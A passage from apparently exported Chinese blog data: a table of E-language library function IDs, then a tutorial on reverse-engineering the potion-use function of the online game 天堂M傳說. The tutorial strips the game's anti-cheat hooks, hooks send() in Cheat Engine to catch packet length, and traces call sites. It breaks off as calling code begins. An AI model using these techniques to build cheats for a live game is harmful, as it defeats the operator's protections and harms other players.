class=\"number\">0x55C</span>：取当前库</span><br><span class=\"line\"><span class=\"number\">0x560</span>：关闭</span><br><span class=\"line\"><span class=\"number\">0x564</span>：全部关闭</span><br><span class=\"line\"><span class=\"number\">0x568</span>：取库文件名</span><br><span class=\"line\"><span class=\"number\">0x56C</span>：是否已打开</span><br><span class=\"line\"><span class=\"number\">0x570</span>：取记录数</span><br><span class=\"line\"><span class=\"number\">0x574</span>：取创建时间</span><br><span class=\"line\"><span class=\"number\">0x578</span>：取字段数</span><br><span class=\"line\"><span class=\"number\">0x57C</span>：取字段名</span><br><span class=\"line\"><span class=\"number\">0x580</span>：改字段名</span><br><span class=\"line\"><span class=\"number\">0x584</span>：取字段类型</span><br><span class=\"line\"><span class=\"number\">0x588</span>：取字段尺寸</span><br><span class=\"line\"><span class=\"number\">0x58C</span>：新建索引</span><br><span class=\"line\"><span class=\"number\">0x590</span>：置当前索引</span><br><span class=\"line\"><span class=\"number\">0x594</span>：取当前索引</span><br><span class=\"line\"><span class=\"number\">0x598</span>：更新索引</span><br><span class=\"line\"><span class=\"number\">0x59C</span>：取索引数</span><br><span class=\"line\"><span class=\"number\">0x5A0</span>：取索引名</span><br><span class=\"line\"><span class=\"number\">0x5A4</span>：取索引字段</span><br><span class=\"line\"><span class=\"number\">0x5A8</span>：置加锁重试时间</span><br><span class=\"line\"><span class=\"number\">0x5AC</span>：锁住数据库</span><br><span class=\"line\"><span class=\"number\">0x5B0</span>：解锁数据库</span><br><span class=\"line\"><span class=\"number\">0x5B4</span>：锁住增删</span><br><span class=\"line\"><span class=\"number\">0x5B8</span>：解增删锁</span><br><span class=\"line\"><span class=\"number\">0x5BC</span>：锁住记录</span><br><span class=\"line\"><span class=\"number\">0x5C4</span>：解锁记录</span><br><span class=\"line\"><span class=\"number\">0x5C8</span>：全部解锁</span><br><span class=\"line\"><span class=\"number\">0x5CC</span>：取平均值</span><br><span class=\"line\"><span class=\"number\">0x5D0</span>：求和</span><br><span class=\"line\"><span class=\"number\">0x5D4</span>：取最大值</span><br><span class=\"line\"><span class=\"number\">0x5D8</span>：取最小值</span><br><span class=\"line\"><span class=\"number\">0x5DC</span>：取最大时间</span><br><span class=\"line\"><span class=\"number\">0x5E0</span>：计算数目</span><br><span class=\"line\"><span class=\"number\">0x5E4</span>：复制结构</span><br><span class=\"line\"><span class=\"number\">0x5E8</span>：复制记录</span><br><span class=\"line\"><span class=\"number\">0x5EC</span>：计算排序</span><br><span class=\"line\"><span class=\"number\">0x5F0</span>：排序</span><br><span class=\"line\"><span class=\"number\">0x5F4</span>：分类计算</span><br><span class=\"line\"><span class=\"number\">0x5F8</span>：添加</span><br><span class=\"line\"><span class=\"number\">0x5FC</span>：加记录</span><br><span class=\"line\"><span class=\"number\">0x600</span>：加空记录</span><br><span class=\"line\"><span class=\"number\">0x604</span>：替换</span><br><span class=\"line\"><span class=\"number\">0x608</span>：修改</span><br><span class=\"line\"><span class=\"number\">0x60C</span>：删除</span><br><span class=\"line\"><span class=\"number\">0x610</span>：是否已删除</span><br><span class=\"line\"><span class=\"number\">0x614</span>：恢复删除</span><br><span class=\"line\"><span class=\"number\">0x618</span>：彻底删除</span><br><span class=\"line\"><span class=\"number\">0x61C</span>：清空</span><br><span class=\"line\"><span class=\"number\">0x620</span>：读</span><br><span class=\"line\"><span class=\"number\">0x624</span>：写</span><br><span class=\"line\"><span class=\"number\">0x628</span>：读字段</span><br><span class=\"line\"><span class=\"number\">0x62C</span>：写字段</span><br><span class=\"line\"><span class=\"number\">0x630</span>：附加字节集</span><br><span class=\"line\"><span class=\"number\">0x634</span>：附加备注</span><br><span class=\"line\"><span class=\"number\">0x638</span>：索引查找</span><br><span class=\"line\"><span class=\"number\">0x63C</span>：查找</span><br><span class=\"line\"><span class=\"number\">0x640</span>：到首记录</span><br><span class=\"line\"><span class=\"number\">0x644</span>：到尾记录</span><br><span class=\"line\"><span class=\"number\">0x648</span>：跳过</span><br><span class=\"line\"><span class=\"number\">0x64C</span>：取记录号</span><br><span class=\"line\"><span class=\"number\">0x650</span>：跳到</span><br><span class=\"line\"><span class=\"number\">0x654</span>：取标签</span><br><span class=\"line\"><span class=\"number\">0x658</span>：记录是否存在</span><br><span class=\"line\"><span class=\"number\">0x65c</span>：标签跳转</span><br><span class=\"line\"><span class=\"number\">0x660</span>：首记录前</span><br><span class=\"line\"><span class=\"number\">0x664</span>：尾记录后</span><br><span class=\"line\"><span class=\"number\">0x668</span>：写出缓存</span><br><span class=\"line\"><span class=\"number\">0x66c</span>：写出所有缓存</span><br><span class=\"line\"><span class=\"number\">0x670</span>：编辑</span><br><span class=\"line\"><span class=\"number\">0x674</span>：置等待鼠标</span><br><span class=\"line\"><span class=\"number\">0x678</span>：恢复鼠标</span><br><span class=\"line\"><span class=\"number\">0x67C</span>：延时</span><br><span class=\"line\"><span class=\"number\">0x688</span>：插入字节集</span><br><span class=\"line\"><span class=\"number\">0x68C</span>：插入文本</span><br><span class=\"line\"><span class=\"number\">0x690</span>：插入文本行</span><br><span class=\"line\"><span class=\"number\">0x694</span>：删除数据</span><br><span class=\"line\"><span class=\"number\">0x698</span>：取文本注册项</span><br><span class=\"line\"><span class=\"number\">0x69C</span>：取数值注册项</span><br><span class=\"line\"><span class=\"number\">0x6A0</span>：取字节集注册项</span><br><span class=\"line\"><span class=\"number\">0x6A4</span>：写注册项</span><br><span class=\"line\"><span class=\"number\">0x6A8</span>：删除注册项</span><br><span class=\"line\"><span class=\"number\">0x6AC</span>：注册项是否存在</span><br><span class=\"line\"><span class=\"number\">0x6C4</span>：取硬盘特征字</span><br><span class=\"line\"><span class=\"number\">0x6F4</span>：转换为主机名</span><br><span class=\"line\"><span class=\"number\">0x6F8</span>：转换为IP地址</span><br><span class=\"line\"><span class=\"number\">0x714</span>：取默认底色</span><br><span class=\"line\"><span class=\"number\">0x71C</span>：快照</span><br><span class=\"line\"><span class=\"number\">0x8BC</span>：取日期</span><br><span class=\"line\"><span class=\"number\">0x8C0</span>：取时间</span><br><span class=\"line\"><span class=\"number\">0x8C8</span>：读配置项</span><br><span class=\"line\"><span class=\"number\">0x8CC</span>：写配置项</span><br><span class=\"line\"><span class=\"number\">0x8D0</span>：取配置节名</span><br><span class=\"line\"><span class=\"number\">0x8D8</span>：打开加密文件</span><br><span class=\"line\"><span class=\"number\">0x8D4</span>：取操作系统类别</span><br><span class=\"line\"><span class=\"number\">0x8DC</span>：是否已加密</span><br><span class=\"line\"><span class=\"number\">0x8E0</span>：置数据库密码</span><br><span class=\"line\"><span class=\"number\">0x8E4</span>：密码输入框</span><br><span class=\"line\"><span class=\"number\">0x8E8</span>：复制密码</span><br><span class=\"line\"><span class=\"number\">0x914</span>：写到内存</span><br><span class=\"line\"><span class=\"number\">0x904</span>：标准输出</span><br><span class=\"line\"><span class=\"number\">0x908</span>：标准输入</span><br><span class=\"line\"><span class=\"number\">0x90C</span>：指针到文本</span><br><span class=\"line\"><span class=\"number\">0x9D4</span>：到字节</span><br><span class=\"line\"><span class=\"number\">0x9D8</span>：到短整数</span><br><span class=\"line\"><span class=\"number\">0x9DC</span>：到整数</span><br><span class=\"line\"><span class=\"number\">0x9E0</span>：到长整数</span><br><span class=\"line\"><span class=\"number\">0x9E4</span>：到小数</span><br><span class=\"line\"><span class=\"number\">0x9F8</span>：左移</span><br><span class=\"line\"><span class=\"number\">0x9FC</span>：右移</span><br><span class=\"line\"><span class=\"number\">0xA7C</span>：取程序名称</span><br><span class=\"line\"><span class=\"number\">0xA8C</span>：取最后错误</span><br><span class=\"line\"><span class=\"number\">0xAA0</span>：文本到UTF8</span><br><span class=\"line\"><span class=\"number\">0xAA4</span>：UTF8到文本</span><br><span class=\"line\"><span class=\"number\">0xAB0</span>：反转整数字节序</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"特殊功能支持库——spec\"><a href=\"#特殊功能支持库——spec\" class=\"headerlink\" title=\"特殊功能支持库——spec\"></a>特殊功能支持库——spec</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x1C</span>：延迟</span><br><span class=\"line\"><span class=\"number\">0x24</span>：申请内存</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"可执行文件数据转换支持库——cnvpe\"><a href=\"#可执行文件数据转换支持库——cnvpe\" class=\"headerlink\" title=\"可执行文件数据转换支持库——cnvpe\"></a>可执行文件数据转换支持库——cnvpe</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x0</span>：转换可执行文件数据</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据操作支持库——dp1\"><a href=\"#数据操作支持库——dp1\" class=\"headerlink\" title=\"数据操作支持库——dp1\"></a>数据操作支持库——dp1</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x0</span>：压缩数据</span><br><span class=\"line\"><span class=\"number\">0x4</span>：解压数据</span><br><span class=\"line\"><span class=\"number\">0x8</span>：取数据摘要</span><br><span class=\"line\"><span class=\"number\">0xC</span>：加密数据</span><br><span class=\"line\"><span class=\"number\">0x10</span>：解密数据</span><br><span class=\"line\"><span class=\"number\">0x14</span>：数字签名</span><br><span class=\"line\"><span class=\"number\">0x18</span>：签名验证</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"互联网支持库——internet\"><a href=\"#互联网支持库——internet\" class=\"headerlink\" title=\"互联网支持库——internet\"></a>互联网支持库——internet</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x0</span>：连接发信服务器</span><br><span class=\"line\"><span class=\"number\">0x4</span>：断开发信服务器</span><br><span class=\"line\"><span class=\"number\">0x8</span>：添加附件文件</span><br><span class=\"line\"><span class=\"number\">0xC</span>：添加附件数据</span><br><span class=\"line\"><span class=\"number\">0x10</span>：清除所有附件</span><br><span class=\"line\"><span class=\"number\">0x14</span>：发送邮件</span><br><span class=\"line\"><span class=\"number\">0x18</span>：置代理服务器</span><br><span class=\"line\"><span class=\"number\">0x1C</span>：HTTP读文件</span><br><span class=\"line\"><span class=\"number\">0x20</span>：连接FTP服务器</span><br><span class=\"line\"><span class=\"number\">0x24</span>：断开FTP服务器</span><br><span class=\"line\"><span class=\"number\">0x28</span>：FTP文件下载</span><br><span class=\"line\"><span class=\"number\">0x2C</span>：FTP文件上传</span><br><span class=\"line\"><span class=\"number\">0x30</span>：FTP删除文件</span><br><span class=\"line\"><span class=\"number\">0x34</span>：FTP文件改名</span><br><span class=\"line\"><span class=\"number\">0x38</span>：FTP创建目录</span><br><span class=\"line\"><span class=\"number\">0x3C</span>：FTP删除目录</span><br><span class=\"line\"><span class=\"number\">0x40</span>：FTP置现行目录</span><br><span class=\"line\"><span class=\"number\">0x44</span>：FTP取现行目录</span><br><span class=\"line\"><span class=\"number\">0x48</span>：FTP目录列表</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"操作系统界面功能支持库——shell\"><a href=\"#操作系统界面功能支持库——shell\" class=\"headerlink\" title=\"操作系统界面功能支持库——shell\"></a>操作系统界面功能支持库——shell</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x0</span>：创建快捷方式</span><br><span class=\"line\"><span class=\"number\">0x4</span>：查询快捷方式</span><br><span class=\"line\"><span class=\"number\">0x8</span>：浏览文件夹</span><br><span class=\"line\"><span class=\"number\">0xC</span>：删除到回收站</span><br><span class=\"line\"><span class=\"number\">0x10</span>：进度复制文件</span><br><span class=\"line\"><span class=\"number\">0x14</span>：进度移动文件</span><br><span class=\"line\"><span class=\"number\">0x18</span>：执行</span><br><span class=\"line\"><span class=\"number\">0x1C</span>：取特定目录</span><br><span class=\"line\"><span class=\"number\">0x20</span>：关闭系统</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"应用接口支持库——eAPI\"><a href=\"#应用接口支持库——eAPI\" class=\"headerlink\" title=\"应用接口支持库——eAPI\"></a>应用接口支持库——eAPI</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x0</span>：取键盘指示灯状态</span><br><span class=\"line\"><span class=\"number\">0x4</span>：模拟按键</span><br><span class=\"line\"><span class=\"number\">0x8</span>：模拟鼠标点击</span><br><span class=\"line\"><span class=\"number\">0xC</span>：取硬盘信息</span><br><span class=\"line\"><span class=\"number\">0x10</span>：取驱动器数量</span><br><span class=\"line\"><span class=\"number\">0x14</span>：取驱动器列表</span><br><span class=\"line\"><span class=\"number\">0x18</span>：弹出光驱</span><br><span class=\"line\"><span class=\"number\">0x1C</span>：关闭光驱</span><br><span class=\"line\"><span class=\"number\">0x20</span>：取光驱盘符</span><br><span class=\"line\"><span class=\"number\">0x24</span>：光驱中是否有盘</span><br><span class=\"line\"><span class=\"number\">0x28</span>：取系统进程列表</span><br><span class=\"line\"><span class=\"number\">0x2C</span>：终止进程</span><br><span class=\"line\"><span class=\"number\">0x30</span>：取正在使用DLL列表</span><br><span class=\"line\"><span class=\"number\">0x38</span>：取系统信息</span><br><span class=\"line\"><span class=\"number\">0x3C</span>：取BIOS信息</span><br><span class=\"line\"><span class=\"number\">0x40</span>：取文件版本信息</span><br><span class=\"line\"><span class=\"number\">0x44</span>：取CPU信息</span><br><span class=\"line\"><span class=\"number\">0x48</span>：取CPU占用率</span><br><span class=\"line\"><span class=\"number\">0x4C</span>：取内存容量信息</span><br><span class=\"line\"><span class=\"number\">0x50</span>：取声卡名称</span><br><span class=\"line\"><span class=\"number\">0x54</span>：打开监视器</span><br><span class=\"line\"><span class=\"number\">0x58</span>：关闭监视器</span><br><span class=\"line\"><span class=\"number\">0x5C</span>：添加右键菜单</span><br><span class=\"line\"><span class=\"number\">0x60</span>：删除右键菜单</span><br><span class=\"line\"><span class=\"number\">0x64</span>：设置自动运行</span><br><span class=\"line\"><span class=\"number\">0x68</span>：删除临时文件</span><br><span class=\"line\"><span class=\"number\">0x6C</span>：清除历史记录</span><br><span class=\"line\"><span class=\"number\">0x94</span>：创建程序组</span><br><span class=\"line\"><span class=\"number\">0x98</span>：删除程序组</span><br><span class=\"line\"><span class=\"number\">0x9C</span>：创建程序项</span><br><span class=\"line\"><span class=\"number\">0xA0</span>：删除程序项</span><br><span class=\"line\"><span class=\"number\">0xA4</span>：取快捷方式目标</span><br><span class=\"line\"><span class=\"number\">0xA8</span>：取网卡信息列表</span><br><span class=\"line\"><span class=\"number\">0xAC</span>：取本机网卡名</span><br><span class=\"line\"><span class=\"number\">0xB0</span>：取本机网卡物理地址</span><br><span class=\"line\"><span class=\"number\">0xB4</span>：取远程网卡物理地址</span><br><span class=\"line\"><span class=\"number\">0xBC</span>：取IP地址</span><br><span class=\"line\"><span class=\"number\">0xC0</span>：撰写邮件</span><br><span class=\"line\"><span class=\"number\">0xC4</span>：取网络类型列表</span><br><span class=\"line\"><span class=\"number\">0xC8</span>：取网络工作组列表</span><br><span class=\"line\"><span class=\"number\">0xCC</span>：取网络计算机列表</span><br><span class=\"line\"><span class=\"number\">0xD0</span>：是否与互联网连接</span><br><span class=\"line\"><span class=\"number\">0xDC</span>：打开特殊系统窗口</span><br><span class=\"line\"><span class=\"number\">0xE0</span>：打开指定网址</span><br><span class=\"line\"><span class=\"number\">0xE4</span>：隐藏桌面图标</span><br><span class=\"line\"><span class=\"number\">0xE8</span>：显示桌面图标</span><br><span class=\"line\"><span class=\"number\">0xEC</span>：隐藏任务栏</span><br><span class=\"line\"><span class=\"number\">0xF0</span>：显示任务栏</span><br><span class=\"line\"><span class=\"number\">0xF4</span>：隐藏系统时钟</span><br><span class=\"line\"><span class=\"number\">0xF8</span>：显示系统时钟</span><br><span class=\"line\"><span class=\"number\">0xFC</span>：隐藏开始按钮</span><br><span class=\"line\"><span class=\"number\">0x100</span>：显示开始按钮</span><br><span class=\"line\"><span class=\"number\">0x104</span>：设置桌面壁纸</span><br><span class=\"line\"><span class=\"number\">0x108</span>：设置窗口透明度</span><br><span class=\"line\"><span class=\"number\">0x10C</span>：取显示模式列表</span><br><span class=\"line\"><span class=\"number\">0x110</span>：取当前显示模式</span><br><span class=\"line\"><span class=\"number\">0x114</span>：设置屏幕分辨率</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"二、组件ID\"><a href=\"#二、组件ID\" class=\"headerlink\" title=\"二、组件ID\"></a>二、组件ID</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x16010030</span>：编辑框</span><br><span class=\"line\"><span class=\"number\">0x16010031</span>：图片框</span><br><span class=\"line\"><span class=\"number\">0x16010032</span>：外形框</span><br><span class=\"line\"><span class=\"number\">0x16010033</span>：画板</span><br><span class=\"line\"><span class=\"number\">0x16010034</span>：分组框</span><br><span class=\"line\"><span class=\"number\">0x16010035</span>：标签</span><br><span class=\"line\"><span class=\"number\">0x16010036</span>：按钮</span><br><span class=\"line\"><span class=\"number\">0x1601016B</span>：时钟</span><br><span class=\"line\"><span class=\"number\">0x16010006</span>：时钟</span><br></pre></td></tr></table></figure>","categories":["Reverse"]},{"title":"天堂M傳說-吃药call的逆向分析","url":"/2024/04/21/%E5%A4%A9%E5%A0%82M%E5%82%B3%E8%AA%AA-%E5%90%83%E8%8D%AFcall%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/","content":"<h1 id=\"天堂M傳說-吃药call的逆向分析\"><a href=\"#天堂M傳說-吃药call的逆向分析\" class=\"headerlink\" title=\"天堂M傳說-吃药call的逆向分析\"></a>天堂M傳說-吃药call的逆向分析</h1><p>• <a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2019-10-7 13:10</p>\n<p><strong>目录</strong></p>\n<p>一、基础理论知识</p>\n<p>二、实践是检验真理的唯一标准</p>\n<p>1、恢复钩子</p>\n<p>2、发包的灵活处理以及分析</p>\n<p>3、调用</p>\n<p>三、总结</p>\n<p>分析对象：<strong>天堂M 傳說</strong></p>\n<p>编程工具：<strong>Visual Studio 2019</strong></p>\n<p>工具：<strong>CheatEngine7.0</strong> （该游戏有调试器检测，OD附加后电脑直接进入卡死状态）、<strong>火绒剑</strong></p>\n<h1 id=\"一、基础理论知识\"><a href=\"#一、基础理论知识\" class=\"headerlink\" title=\"一、基础理论知识\"></a>一、基础理论知识</h1><p>既然是吃药call，那么我们需要先思考一下这个call的一些信息，比如说他的参数个数，触发时机等等，这样的话才能方便我们去逆向找出这个call。</p>\n<p>首先我们明确两点：1、这个游戏的是一个网络游戏，那么就说明他和服务器存在着数据的交互，用来保证数据的正确性**(封包的检测)<strong>，举个例子：我们要做某个动作，那么此时客户端</strong>(就是我们正在玩的游戏)<strong>就会向服务器发送一个封包数据，然后服务器对这个封包进行一个验证，该动作是否合法或者可以操作，然后服务器再发送一个结果封包到客户端，客户端接收到封包后进行处理。如果合法，那么进行这个操作，如果不合法就阻止或者非法提示</strong>(封号)**。2、我们既然是要找吃药call，那么肯定是在我们吃药的时候才会触发的游戏内部call，因为游戏不可能说在我们做其他动作的时候游戏会调用的吃药call(该情况可以存在，但是没有必要)。明确了上面两点后，我们呢就有了一些找call的思路。</p>\n<p><strong>思路一</strong>：通过发包。因为在我们吃药的时候，客户端肯定会发送一个封包到服务器，用来验证这个动作是否可行，然后服务器反馈到客户端。我们就可以直接在相关发包的函数头下一个断点，然后吃药，断下的时候，我们就可以通过不断的返回上一层来定位到吃药call。</p>\n<p><strong>思路二</strong>：通过物品的属性去逆向查找。因为药品是背包的物品，那么我们吃药这个动作也相当于一个使用背包物品的动作，此时，游戏需要知道我们使用了背包的哪个物品。然后再根据这个物品去调用他的相关函数。所以说，在我们找吃药call的时候需要注意一些的参数**(也就是push的值)<strong>,因为他极大的可能会存着药品的某个属性</strong>(比如：地址、ID、数量)**。因此我们就可以通过这个特性直接在药品的相关属性下一个访问断点，通过调试器给我们断下的地方去定位到一些关键代码段，然后再进行逆向反推，这样的方法也是可以找到吃药call的。</p>\n<p>笔者在本篇文章中采用的是思路一，原因是思路二看起来虽然道理很简单，但是真要去逆向反推的话其过程是相当繁琐和困难的，因为游戏公司不可能给你轻轻松松的找到call，他们肯定会进行一些代码处理和加密，让逆向的难度大大增加。其困难的程度由该call的火爆性决定**(如果一个call被众多外挂所利用，那么游戏公司会对其进行一些处理，例如:加密，检测)**。话不多说，咱们开始搞事！</p>\n<p><img src=\"/../images/GameHacker/%E5%A4%A9%E5%A0%82M%E5%82%B3%E8%AA%AA-%E5%90%83%E8%8D%AFcall%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/Untitled.png\"></p>\n<h1 id=\"二、实践是检验真理的唯一标准\"><a href=\"#二、实践是检验真理的唯一标准\" class=\"headerlink\" title=\"二、实践是检验真理的唯一标准\"></a>二、实践是检验真理的唯一标准</h1><p>咱们既然是通过发包下手，那么简单来介绍一下常见的发包函数: send,sendto,WSASend，这些呢基本都是现在比较常见的发包函数，游戏也基本上也是通过这三个发包函数中的其中一个去与服务器交互的。Emmm，既然我们知道，那么游戏公司也知道，所以咱们相对于某些游戏来说，直接在这些函数头部下断是会吃瘪的，需要去瞎搞更深底层的WSPSend。因为本篇文章所采用的游戏对其的处理并不怎么高手，这里呢我就不过多讨论。</p>\n<h1 id=\"1、恢复钩子\"><a href=\"#1、恢复钩子\" class=\"headerlink\" title=\"1、恢复钩子\"></a>1、恢复钩子</h1><p>这里我用的是火绒剑**(官方认可工具,强大又安全)**。咱们打开游戏后先来看一下这游戏干了什么事。打开火绒剑扫描钩子。</p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 1.png)</p>\n<p>通过扫描结果我们会发现这个游戏下了很多的钩子，其中有一个就是发包函数send的钩子，我们双击看一下。</p>\n<p><img src=\"/../images/GameHacker/%E5%A4%A9%E5%A0%82M%E5%82%B3%E8%AA%AA-%E5%90%83%E8%8D%AFcall%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/QQ%E5%9B%BE%E7%89%8720221016013535.png\" alt=\"QQ图片20221016013535\"></p>\n<p>发现他的头变成了jmp，而且目的地址为游戏地址。为了确保调试正常，我们待会把他下的所有钩子全部恢复。<strong>这里注意：钩子的恢复必须要在游戏内，如果恢复钩子过早那么游戏会提示一些错误。简单说就是你得在游戏界面为以下时才能恢复。</strong></p>\n<p><img src=\"/../images/GameHacker/%E5%A4%A9%E5%A0%82M%E5%82%B3%E8%AA%AA-%E5%90%83%E8%8D%AFcall%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1648093052946-09bc4e8c-4939-49bf-a7da-f263ded07320.png\" alt=\"1648093052946-09bc4e8c-4939-49bf-a7da-f263ded07320\"></p>\n<h1 id=\"2、发包的灵活处理以及分析\"><a href=\"#2、发包的灵活处理以及分析\" class=\"headerlink\" title=\"2、发包的灵活处理以及分析\"></a>2、发包的灵活处理以及分析</h1><p>这个游戏用的是send发包，因为三大发包函数里只有这个下断后会断下。我们用CE附加游戏后到send头部尝试下断后做动作看看。</p>\n<p><img src=\"/../images/GameHacker/%E5%A4%A9%E5%A0%82M%E5%82%B3%E8%AA%AA-%E5%90%83%E8%8D%AFcall%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/aaaaa.png\" alt=\"aaaaa\"></p>\n<p>我们会发现，一旦我们下断点后，切回游戏的一瞬间，断点就被断下，无论我们重复多少次都是如此。而我们当前想要是，只有在游戏角色做某出些动作时才断下。这个就与我们想做的事产生了一些矛盾，那怎么办呢？</p>\n<p><img src=\"/../images/GameHacker/%E5%A4%A9%E5%A0%82M%E5%82%B3%E8%AA%AA-%E5%90%83%E8%8D%AFcall%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422.png\" alt=\"1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422\"></p>\n<p>我们先思考一下为什么在我们切回游戏的时候，断点会断下？断点一旦被断下就说明了有封包发送到服务器，可是客户端(游戏)为什么在我们切回游戏的时候要发送封包呢？其实在切回游戏后，游戏会瞬间发送一个封包到服务器是有一定作用的，这个作用类似于游戏拉回操作。用FPS来说的话就是防止瞬移，有些FPS能实现网截瞬移就是因为游戏并不会对服务器发送一个校验的封包**(有的直接通过第三方工具拦截封包实现瞬移)**，如果说游戏不断的向服务器发送一个请求正确位置的封包，那么服务器接收到后就会返回一个正确位置的封包，然后游戏会进行一个判断，如果当前位置不正确就直接拉回。大致原理就是这个意思。明白这个之后我们来看一下怎么去解决这个问题。稍微学过socket编程的都知道，send函数他有一个参数是包长，我们贴上MSDN的定义：</p>\n<p>![1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422%201](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422 1.png)</p>\n<p>在游戏中，不同的动作他的包长也会发生变化的，因为动作不同，包数据也不同。**(当然不排除一些包长一样的动作)**，那么我们就可以通过这个包长去下一个条件断点，只有当包长是吃药时的包长才让断点断下。那么问题来了，我们怎么知道他这个包长是多少，上面也说了，我们一下断点切回游戏，游戏就会发送一个类似校验的封包，使游戏断下，这样的话我们也没法观察吃药时的封包包长。但是只要思想不滑坡，办法总比困难多。咱们直接来一个HOOK获取包长就行了。我们在send头部下断让其断下，然后返回到外层。</p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 2.png)</p>\n<p>**(为什么不在send头部下断点，因为CE好像不支持[esp+xx] &#x3D;&#x3D; xx 这样类型的断点，反正我没下成功)**，通过send的定义，包长是第三个参数，那么对应的就是eax是我们的包长，我们可以直接在push eax 下面一句进行一个hook。我们首先分配一个空白地址用来保存我们的eax，我申请的地址为0x03830000,我们直接用CE自带的代码注入HOOK，</p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 3.png)</p>\n<p>HOOK后，咱们把刚刚申请到的地址放到列表看看。</p>\n<p>![1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422%202](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422 2.png)</p>\n<p>我这里以16进制显示，我们发现现在我们可以看到包长了。</p>\n<p>![1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422%203](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422 3.png)</p>\n<p>那么咱们去吃药，发现吃药的时候包长也是0xE，那好办，下一个条件断点。</p>\n<p>![1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422%204](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422 4.png)</p>\n<p>咱们回去吃药，注意：确保你是吃药后才断下的。因为我说了，不排除其他动作包长也是0xE。</p>\n<p>吃药断下后，我们记录一下跟踪到的CALL。</p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 4.png)</p>\n<p>红框是我们要看的，因为红框以外的call，通过观察参数，基本上就不是了。</p>\n<p>咱们从上往下看。</p>\n<p><strong>第一个call：GameClient80.bin+672b0c</strong></p>\n<p>![1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422%205](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;1648093081482-4f9c5bcd-5d04-4459-ac22-48e4acd97422 5.png)</p>\n<p>看到他是call 寄存器的形式，基本上也不用看。</p>\n<p><strong>第二个call：GameClient80.bin+66CABB</strong></p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 5.png)</p>\n<p><strong>第三个 call：GameClient80.bin+ 66CF3A</strong></p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 6.png)</p>\n<p><strong>第四个 call：GameClient80.bin+ 603F1D</strong></p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 7.png)</p>\n<p><strong>第五个 call：GameClient80.bin+ 603AB5</strong></p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 8.png)</p>\n<p><strong>第六个 call：GameClient80.bin+ 617B76</strong></p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 9.png)</p>\n<p>到这里呢我们基本上是获取到有关吃药的call了，上面的六个call里也是包含了真实的吃药call，但是呢，我这里就不继续分析了，直接摊牌。</p>\n<p>![](..&#x2F;images&#x2F;GameHacker&#x2F;天堂M傳說-吃药call的逆向分析&#x2F;Untitled 10.png)</p>\n<p>我用的是第五个call。其他的call大家可以去尝试，除了第一个call,因为第一个call进去后直接是send发包，就意味着第一个call只是负责给服务器发送一个封包来检测这个动作是否合法，他直接跳过了动作的封装。</p>\n<h1 id=\"3、调用\"><a href=\"#3、调用\" class=\"headerlink\" title=\"3、调用\"></a>3、调用</h1><p>调用非常的简单，因为我用的是第五个call，我也分析过了，我就直接贴上结果。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">push <span 